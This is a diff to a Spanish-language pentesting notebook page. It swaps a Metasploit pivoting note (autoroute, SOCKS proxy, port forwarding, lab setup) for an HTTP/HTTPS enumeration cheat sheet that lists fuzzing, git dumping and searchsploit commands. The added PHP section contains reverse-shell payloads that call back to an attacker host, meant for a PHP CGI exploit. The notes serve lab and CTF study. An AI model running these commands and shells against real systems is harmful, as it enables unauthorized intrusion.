@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
-    <title>Metasploit | Notebook</title>
+    <title>80,443 - HTTP,HTTPS | Notebook</title>
     <link rel="stylesheet" href="/section.css" />
   </head>
   <body>
@@ -20,7 +20,7 @@
             <details class="vault-folder" open>
               <summary>Pivoting</summary>
               <a class="vault-file" href="/notebook/pivoting/ligolo.html">Ligolo</a>
-              <a class="vault-file is-active" href="/notebook/pivoting/metasploit.html">Metasploit</a>
+              <a class="vault-file" href="/notebook/pivoting/metasploit.html">Metasploit</a>
               <a class="vault-file" href="/notebook/pivoting/chisel-socat.html">Chisel y Socat</a>
             </details>
             <details class="vault-folder" open>
@@ -35,7 +35,7 @@
               <a class="vault-file" href="/notebook/enumeracion-puertos/25-smtp.html">25 - SMTP</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/53-dns.html">53 - DNS</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/79-finger.html">79 - Finger</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/80-443-http-https.html">80,443 - HTTP,HTTPS</a>
+              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/80-443-http-https.html">80,443 - HTTP,HTTPS</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/88-kerberos.html">88 - Kerberos</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/135-rpc.html">135 - RPC</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/139-445-smb.html">139,445 - SMB</a>
@@ -66,9 +66,9 @@
           </nav>
         </aside>
 
-        <article class="note-panel is-active" id="metasploit">
+        <article class="note-panel is-active" id="80-443-http-https">
           <div class="note-tabbar">
-            <span>Metasploit</span>
+            <span>80,443 - HTTP,HTTPS</span>
             <details class="notebook-tag-search">
               <summary>Buscar tags</summary>
               <label>
@@ -77,123 +77,130 @@
               </label>
               <div class="notebook-search-results" aria-live="polite"></div>
             </details>
-            <span>~/notebook/Pivoting</span>
+            <span>~/notebook/Enumeración de Puertos</span>
           </div>
 
           <div class="note-content">
-            <p class="eyebrow">pivoting / metasploit</p>
-            <h2>Metasploit</h2>
+            <p class="eyebrow">enumeración de puertos / http,https</p>
+            <h2>80,443 - HTTP,HTTPS</h2>
 
-            <img class="note-image" src="/notebook-assets/pivoting/metasploit.png" alt="Metasploit pivoting" />
-
-            <h2>1. Ver interfaces de red</h2>
             <section class="code-card">
-              <h3>Meterpreter: ver interfaces de red</h3>
-              <pre><code>ipconfig</code></pre>
-            </section>
-
-            <h2>2. Autoroute</h2>
-            <section class="code-card">
-              <h3>Meterpreter</h3>
-              <pre><code>run autoroute -s &lt;red_interna&gt;/24
-run autoroute -p</code></pre>
+              <h3>Nikto y nmap fuzzer lanzar en paralelo</h3>
+              <pre><code># Escaneo simple con Nikto
+nikto -url &lt;url&gt; 
+# Fuzzer pequeño
+nmap --script http-enum -p80 &lt;ip_victima&gt;</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Metasploit</h3>
-              <pre><code>route add &lt;red_interna&gt; &lt;mascara_subred&gt; &lt;session_id_meterpreter&gt;
-route print # Vemos las rutas activas</code></pre>
-            </section>
-
-            <h2>3. Escanear red interna</h2>
-            <section class="code-card">
-              <h3>Enumerar hosts: one-liner</h3>
-              <pre><code># Bash
-for i in {1..254}; do (ping -c 1 -W 1 10.10.10.$i | grep "64 bytes" &amp;) 2&gt;/dev/null; done
-for i in {1..254}; do (ping -c 1 -W 1 10.10.10.$i | grep "bytes from" &amp;); done
-
-# CMD
-for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.0.%i &gt; nul &amp;&amp; echo 192.168.0.%i is up.</code></pre>
+              <h3>Tecnologías: whatweb</h3>
+              <pre><code>whatweb &lt;url&gt; # Análisis básico.
+whatweb -v &lt;url&gt; # Escaneo detallado con más información.
+# Revisar esploits de versiones vulnerables</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Metasploit: enumerar puertos</h3>
-              <pre><code>use scanner/portscan/tcp
-set RHOSTS &lt;ip_victima_final&gt;
-run</code></pre>
+              <h3>Analizar HTML de la Web en Markdown</h3>
+              <pre><code>curl -s &lt;url&gt; | html2markdown</code></pre>
+            </section>
+
+            <h3>Fuzz</h3>
+
+            <section class="code-card">
+              <h3>Fuzzing Directorios</h3>
+              <pre><code>wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://target/FUZZ/
+
+gobuster dir -u http://target/ -w /directory-list-2.3-medium.txt -t 50</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Proxychains: preparar escaneo con Nmap</h3>
-              <pre><code># Kali
-cat /etc/proxychains4.conf
+              <h3>Fuzzing Archivos</h3>
+              <pre><code>wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,html-php-txt-aps-aspx http://target/FUZZ.FUZ2Z/
 
-# Recomendado:
-# Descomentar: dynamic_chain
-# Comentar: strict_chain
-# Añadir al final:
-# socks4 127.0.0.1 9050</code></pre>
+gobuster dir -u http://target/ -w /directory-list-2.3-medium.txt -x php,aspx -t 50</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Metasploit: levantar proxy SOCKS</h3>
-              <pre><code>use auxiliary/server/socks_proxy
-set SRVPORT 9050
-set VERSION 4a
-exploit -j
-jobs</code></pre>
+              <h3>Fuzzing SubDominios</h3>
+              <pre><code>ffuf -u &quot;http://flight.htb&quot; -H &quot;Host: FUZZ.flight.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50
+
+gobuster vhost -u http://&lt;IP&gt; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --domain &lt;domain&gt; --append-domain
+# Agregar Nuevos Dominios al /etc/hosts. HTB: Flight StreamIO</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Kali: escaneo a través del pivote</h3>
-              <pre><code>proxychains nmap &lt;ip_victima_final&gt; -sT -Pn -sV -p 445</code></pre>
+              <h3>Fuzzing Extensiones válidas en upload file</h3>
+              <pre><code># Burpsuite</code></pre>
             </section>
 
-            <h2>4. Port-forwarding</h2>
             <section class="code-card">
-              <h3>Meterpreter</h3>
-              <pre><code># -l &lt;puerto_local&gt; -p &lt;puerto_objetivo_victima_final&gt; -r &lt;ip_victima_final&gt;
-portfwd add -l 5000 -p 80 -r 10.10.10.5
-portfwd list # Listar port-forwardings activos
+              <h3>Fuzzing Webs SSL gobuster</h3>
+              <pre><code># Añadir parametro -k</code></pre>
+            </section>
 
-# Nos hemos traído a nuestra máquina atacante Kali el puerto 80 de la víctima final.
-# Desde el navegador veremos en localhost:5000 la web de la víctima final en el puerto 80.</code></pre>
+            <section class="code-card">
+              <h3>Primer fuzzing completo</h3>
+              <pre><code>feroxbuster -u &lt;url&gt; -x php -C 404 -A --wordlist &#x27;/seclists/Discovery/Web-Content/directory-list-2.3-big.txt&#x27; -B --auto-tune</code></pre>
+            </section>
+
+            <h3>.git</h3>
+
+            <section class="code-card">
+              <h3>Dumpear acceso .git</h3>
+              <pre><code>pipx install git-dumper
+git-dumper http://url/.git git_loot
+# Check último commit
+git log
+# Check commit diff
+git show 967fa71c359fffcbeb7e2b72b27a321612e3ad11</code></pre>
+            </section>
+
+            <h3>Ficheros</h3>
+
+            <section class="code-card">
+              <h3>Ficheros importantes</h3>
+              <pre><code> robots.txt
+ index.html 
+ index.php
+ login.php
+ cgi-sys
+ cgi-mod
+ cgi-bin</code></pre>
+            </section>
+
+            <h3>Versiones</h3>
+
+            <section class="code-card">
+              <h3>Apache 2.4.49 vulnerable a Path Traversal</h3>
+              <pre><code>Apache 2.4.49</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Version HFS vulnerable HTTP Files Server httpd 2.3</h3>
+              <pre><code>searchsploit hfs
+use exploit/windows/http/rejetto_hfs_exec</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Version PHP en php.info 5.2.4</h3>
+              <pre><code>searchsploit php cgi
+searchsploit -m 18836
+mv 18836.py exploit.py
+# exploit.py: Sustituir &lt;?php phpinfo();?&gt;
+&lt;?php php -r &#x27;$sock=fsockopen(&quot;&lt;kali_ip&gt;&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;?&gt;
+&lt;?php php -r &#x27;$sock=fsockopen(&quot;&lt;kali_ip&gt;&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;4 &gt;&amp;4 2&gt;&amp;4&quot;);&#x27;?&gt;</code></pre>
             </section>
 
             <aside class="callout warning">
-              <p>Una vez que Metasploit tiene una ruta hacia esa red mediante <code>autoroute</code> o <code>route add</code>, los módulos pueden abrir conexiones TCP directamente contra la IP interna y el puerto objetivo a través de la sesión comprometida.</p>
-              <p>El port-forwarding sirve para traer un servicio concreto al localhost de la máquina atacante. No es necesario para que Metasploit alcance SSH si ya puede enrutar tráfico TCP a través del pivote.</p>
+            <p>Firefox <code>about:config</code> -> <code>security.tls.version.min = 1</code></p>
             </aside>
-
-            <aside class="callout danger">
-              <p>Si queremos conectarnos desde Kali por SSH a la máquina víctima final, sí haría falta port-forwarding o usar Proxychains.</p>
-              <p>Ojo con los payloads: en escenarios de pivoting suele ser más práctico usar payloads de tipo <code>bind</code>, porque la víctima final normalmente no tiene conectividad directa de vuelta hacia la máquina atacante.</p>
-            </aside>
-
-            <h2>5. Montar escenario de prueba</h2>
-            <ul>
-              <li><span class="lab-red">Máquina Linux atacante</span></li>
-              <li><span class="lab-blue">Máquina Windows 7 vulnerable intermedia</span></li>
-              <li><span class="lab-yellow">Máquina Windows 7 vulnerable final</span></li>
-            </ul>
-
-            <img class="note-image" src="/notebook-assets/pivoting/escenario-prueba.png" alt="Escenario de prueba para pivoting" />
-
-            <p>Desde <code>VMware</code> montamos los tres sistemas operativos y configuramos las redes para crear el escenario de prueba.</p>
-            <p><span class="lab-red">Máquina Linux atacante:</span> ponemos la red en modo <code>Bridged</code> con una sola interfaz.</p>
-            <p><span class="lab-blue">Máquina Windows 7 vulnerable intermedia:</span> ponemos una interfaz en modo <code>Bridged</code> y otra en <code>NAT</code>, creando una red NAT propia con una <code>IP de red</code>, por ejemplo <code>10.10.10.0/24</code>.</p>
-            <p><span class="lab-yellow">Máquina Windows 7 vulnerable final:</span> conectamos una sola interfaz a la misma red <code>NAT</code> que la máquina intermedia.</p>
-            <p>Finalmente comprobamos que mediante <code>ping</code> la máquina <span class="lab-red">Linux</span> tenga accesibilidad con la máquina <span class="lab-blue">intermedia</span>, pero no con la máquina <span class="lab-yellow">final</span>. La máquina <span class="lab-blue">intermedia</span> debe tener conectividad con ambas mediante <code>ping</code>.</p>
 
             <h2>Tags</h2>
             <div class="tag-list">
-              <span>pivoting</span>
-              <span>metasploit</span>
-              <span>meterpreter</span>
-              <span>autoroute</span>
-              <span>port-forwarding</span>
-              <span>proxychains</span>
-              <span>socks</span>
+              <span>ports</span>
+              <span>http</span>
+              <span>p80</span>
+              <span>p443</span>
             </div>
           </div>
         </article>
